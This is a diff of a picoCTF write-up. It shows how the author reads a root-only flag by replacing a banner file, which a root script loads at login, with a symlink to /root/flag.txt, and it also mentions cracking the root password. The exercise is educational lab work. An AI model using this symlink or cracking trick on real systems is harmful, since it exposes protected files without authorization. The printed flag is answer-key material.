@@ -33,9 +33,9 @@ John Draper
 
 player@challenge:~$ 
 
-## Now we're in .............. 
+## Hey freaks, we're in now
 
-## From here , I solved it in two ways. First as the questions suggests  the flag is in root folder. 
+## There are two hints, let's try with second trick first 😎 . First as the questions suggests  the flag is in root folder. 
 let's check the permission of flag.txt 
 
 __________________________________________________________________________________
@@ -60,10 +60,10 @@ player@challenge:/root$
 ____________________________________________________________________________________**
 
 As we can see, it you need root Privileges to read the file . 
-As I described above , I solved it in two ways. 
+As I said there are two hint above , I solved it in two ways. 
 
 1. Crack the password of root  and enter as root to read the contents of the file 
-2. use the Hint provided and following along the way to solve it. 
+2. use the Hint of symblink and following along the way to solve it. 
 
 ## Firstly am going to crack the password of root (First way)
 
@@ -111,7 +111,95 @@ ________________________________________________________________________________
 
 Oh , you did it buddy. "iloveyou" is the password of root. Switch to root and read the contents of the file. 
 
-## let's go for another way (second approach to solve it)
+# let's go for another way (second approach to solve it- symlink)
 
-I will continue it latter ................
+
+As we saw that you'll need to have root privileges to read the content and we cracked the hash and  entered as root. 
+But this time, we're gonna use the **First Hint-Symlink**
+
+See the following, we can find script.py let also read what this says
+
+**player@challenge:/root$ ls -la
+ls -la
+total 16
+drwxr-xr-x 1 root root    6 Mar  9 16:39 .
+drwxr-xr-x 1 root root   41 May 16 07:36 ..
+-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+-rwx------ 1 root root   46 Mar  9 16:39 flag.txt
+-rw-r--r-- 1 root root 1317 Feb  7 17:25 script.py
+player@challenge:/root$ cat script.py**
+
+__________________________________________________
+**player@challenge:/root$ cat script.py
+cat script.py
+
+import os
+import pty
+
+incorrect_ans_reply = "Lol, good try, try again and good luck\n"
+
+if __name__ == "__main__":
+    try:
+      with open("/home/player/banner", "r") as f:
+        print(f.read())
+    except:
+      print("*********************************************")
+      print("***************DEFAULT BANNER****************")
+      print("*Please supply banner in /home/player/banner*")
+      print("*********************************************")
+
+try:
+    request = input("what is the password? \n").upper()
+    while request:
+        if request == 'MY_PASSW@RD_@1234':
+            text = input("What is the top cyber security conference in the world?\n").upper()
+            if text == 'DEFCON' or text == 'DEF CON':
+                output = input(
+                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
+                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
+                    scmd = 'su - player'
+                    pty.spawn(scmd.split(' '))
+
+                else:
+                    print(incorrect_ans_reply)
+            else:
+                print(incorrect_ans_reply)
+        else:
+            print(incorrect_ans_reply)
+            break
+
+except:
+    KeyboardInterrupt**
+______________________________________________________________________
+
+**Note: We can see that everytime we connect back to server, it loads /home/player/banner**
+
+--> Now , we'll use symlink here, 
+
+## **Symlinks, or symbolic links, are a type of file system object that acts as a reference to another file or directory**
+
+**creating a symlink like creating refrence not actual hard link , we'll create symbolik link for /root/flag.txt in the home directory of user.**
+**So, when we connect back to sever it will load the banner which will be referrencing the /root/flag.txt and flag will be loaded.**
+
+Let's first move or rename the banner in home directory of user
+
+**player@challenge:~$ mv banner hint   
+mv banner hint
+player@challenge:~$ ls
+ls
+hint  text**
+
+Now, let make symlink of flag using following command : 
+
+**player@challenge:~$ ln -s /root/flag.txt banner
+ln -s /root/flag.txt banner
+player@challenge:~$ ls
+ls
+banner  hint  text**
+
+We have made it, just exit and connect back to server, it will load the banner , which referrencing flag and you'll have flag.
+
+muneer1631-picoctf@webshell:~$ nc tethys.picoctf.net 56152
+picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}
 
